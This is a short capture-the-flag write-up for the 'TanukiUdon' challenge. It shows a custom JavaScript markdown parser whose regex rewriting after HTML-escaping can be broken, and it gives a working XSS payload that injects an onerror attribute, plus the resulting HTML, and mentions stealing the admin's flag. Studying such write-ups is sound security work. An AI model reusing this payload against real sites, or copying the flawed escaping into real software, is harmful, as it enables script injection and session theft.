### TanukiUdon

The challenge implemented a custom markdown parser:

```js
const escapeHtml = (content) => {
  return content
    .replaceAll('&', '&amp;')
    .replaceAll(`"`, '&quot;')
    .replaceAll(`'`, '&#39;')
    .replaceAll('<', '&lt;')
    .replaceAll('>', '&gt;');
}

const markdown = (content) => {
  const escaped = escapeHtml(content);
  return escaped
    .replace(/!\[([^"]*?)\]\(([^"]*?)\)/g, `<img alt="$1" src="$2"></img>`)
    .replace(/\[(.*?)\]\(([^"]*?)\)/g, `<a href="$2">$1</a>`)
    .replace(/\*\*(.*?)\*\*/g, `<strong>$1</strong>`)
    .replace(/  $/mg, `<br>`);
}
```

We've managed to get an XSS via a note with:

```md
![]([)]( onerror=alert`1` )
```

which parsed to:

```html
<img alt="" src="<a href=" onerror=alert`1` ">"></img></a>
```

From there we simply executed the arbitrary XSS and stole admin's flag.
